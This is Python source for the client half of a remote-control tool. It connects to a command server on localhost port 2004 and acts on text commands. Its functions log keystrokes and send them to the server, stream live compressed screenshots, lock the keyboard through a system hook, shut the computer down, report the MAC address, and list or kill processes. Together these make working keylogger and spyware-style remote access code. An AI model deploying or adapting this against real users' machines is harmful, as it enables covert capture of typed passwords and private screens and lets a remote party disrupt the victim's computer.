import socket
from _thread import *
import keyboard
import pythoncom, pyHook 
from zlib import compress
from mss import mss
import os
from uuid import getnode as get_mac
import wmi
import psutil

WIDTH = int(1366 / 1)
HEIGHT = int(768 / 1)
f = wmi.WMI()

ClientMultiSocket = socket.socket()
host = '127.0.0.1'
port = 2004

boolCatchKeyboard = False
isNotLockKeyboard = True
recording = False

def CatchKeyboard(message):
    global boolCatchKeyboard
    ClientMultiSocket.send(str.encode(message))
            
    boolCatchKeyboard = True

    def sendKeyboard():
        global boolCatchKeyboard
        while boolCatchKeyboard:  # making a loop
            char = keyboard.read_key()
            if char:   
                print(char)
                if (boolCatchKeyboard):
                    ClientMultiSocket.send(str.encode(char))
        
    start_new_thread(sendKeyboard, ())

def EndCatchKeyboard():
    global boolCatchKeyboard
    boolCatchKeyboard = False
    ClientMultiSocket.send(str.encode("EnDCatCh"))
    ClientMultiSocket.send(str.encode("end"))

def LockKeyboard():
    global isNotLockKeyboard
    isNotLockKeyboard = False

    def disable():
        def isUnLock(event):
            return isNotLockKeyboard 

        hm = pyHook.HookManager()
        hm.KeyAll = isUnLock
        hm.HookKeyboard()
        pythoncom.PumpMessages()

    start_new_thread(disable,())

def UnLockKeyboard():
    global isNotLockKeyboard
    isNotLockKeyboard = True

def WatchLiveScreen(message):
    global recording
    if recording == False:
        ClientMultiSocket.send(str.encode(message))
        
        def send_screenshot():
            global recording
            recording = True

            try: 
                with mss() as sct:
                    rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
                    while recording:
                        img = sct.grab(rect)
                        pixels = compress(img.bgra, 1)
                        size = len(pixels)
                        size_len = (size.bit_length() + 7) // 8
                        ClientMultiSocket.send(bytes([size_len]))
                        size_bytes = size.to_bytes(size_len, 'big')

                        ClientMultiSocket.send(size_bytes)
                        ClientMultiSocket.send(pixels)

            except Exception as e:
                print(e)

        start_new_thread(send_screenshot,())

def StopWatchLiveScreen(message):
    global recording
    recording = False
    ClientMultiSocket.send(str.encode(message))

def Shutdown():
    os.system("shutdown /s /t 1")

def Logout():
    ClientMultiSocket.close()

def GetMacAddress(message):
    ClientMultiSocket.send(str.encode(message))
    mac = get_mac()
    mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
    ClientMultiSocket.send(str.encode(str(mac)))

def ShowProcesses(message):
    # print("pid   Process name")

    ClientMultiSocket.send(str.encode(message))

    for process in f.Win32_Process():

        # Displaying the P_ID and P_Name of the process
        ClientMultiSocket.send(str.encode(f"{process.ProcessId:<10} {process.Name}"))
        
        # print(f"{process.ProcessId:<10} {process.Name}")

    ClientMultiSocket.send(str.encode("EndOfListProcess"))

def KillProcess():
    res = ClientMultiSocket.recv(1024)
    message = int(res.decode('utf-8'))
    print(message)
    try:
        process = psutil.Process(message)
        process.kill()                    

    except Exception as e:
        pass        


print('Waiting for connection response')
try:
    ClientMultiSocket.connect((host, port))
    while True:
        res = ClientMultiSocket.recv(1024)
        if not res:
            ClientMultiSocket.close()
            print('close')
            break

        message = res.decode('utf-8')
        print(message)

        if (message == "CatchKeyboard"):
            CatchKeyboard(message)
            

        if (message == "EndCatchKeyboard"):
            EndCatchKeyboard()


        if (message == "LockKeyboard"):
            LockKeyboard()

        if (message == "UnLockKeyboard"):
            UnLockKeyboard()
            
        if (message == "watchLiveScreen"):
            WatchLiveScreen(message)
            

        if (message == "stopWatchLiveScreen"):
            StopWatchLiveScreen(message)
           

        if (message == "shutdown"):
            Shutdown()
            
        if (message == "logout"):
            Logout()
            break

        if (message == "getMacAddress"):
            GetMacAddress(message)

        if (message == "showFolderTree"):
            
            pass

        if (message == "showProcesses"):
            ShowProcesses(message)

        if (message == "killProcess"):
            KillProcess()

except socket.error as e:
    ClientMultiSocket.close()
    print(e)
    print('close')




